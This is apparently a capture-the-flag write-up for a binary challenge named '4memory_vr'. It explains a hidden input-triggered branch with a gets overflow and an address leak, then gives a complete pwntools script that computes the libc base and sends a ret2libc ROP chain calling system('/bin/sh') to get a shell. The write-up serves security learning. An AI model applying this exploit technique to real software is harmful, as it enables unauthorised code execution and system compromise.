# 4memory_vr

## Solution

For this challenge, a quick comb of the binary shows that it looks complicated. We then noticed that there seems to be a special cheat section of the binary activated by providing certain inputs:
```
00401386      if (var_60 == 0x539 && var_68 == 0x7a69 && var_64 == 0x7a69 && var_6c == 0x539)
004013a1          printf(format: "It seems like your a hacker! Enjâ€¦", get_long_long)
```
We also notice that, in this section, there is a call to gets. Thus, this appears to be a ROP challenge. We also notice that it gives the address to some function called `get_long_long`, which is in an external library. Thus, the strategy becomes to use this address to find the address of libc and then do a ret2libc.

After dynamic analysis of the binary, we notice that there is an offset between `get_long_long` and the base of `libc` of `1977665`. Using all of this, we create the following exploit:
```python
p = start()

p.sendlineafter(b"Choice:", b'F')
p.sendlineafter(b"column):", str(0x539).encode('utf-8') + b',' + str(0x7a69).encode('utf-8'))
p.sendlineafter(b"column):", str(0x7a69).encode('utf-8') + b',' + str(0x539).encode('utf-8'))

p.recvuntil(b"0x")
leak = int(p.recv(12), 16)
libc.address = leak - 1977665

log.info(f"get_long_long: {hex(leak)}")
log.info(f"puts: {hex(libc.sym['puts'])}")

r = ROP(libc)
ret_gadget = r.find_gadget(['ret'])[0]
pop_rdi_gadget = r.find_gadget(['pop rdi','ret'])[0]
bin_sh_gadget = next(libc.search(b'/bin/sh'))
system_gadget = libc.sym['system']

chain = cyclic(0x38)
chain += p64(ret_gadget)
chain += p64(pop_rdi_gadget)
chain += p64(bin_sh_gadget)
chain += p64(system_gadget)

p.sendlineafter(b'>>>', chain)

p.interactive()
```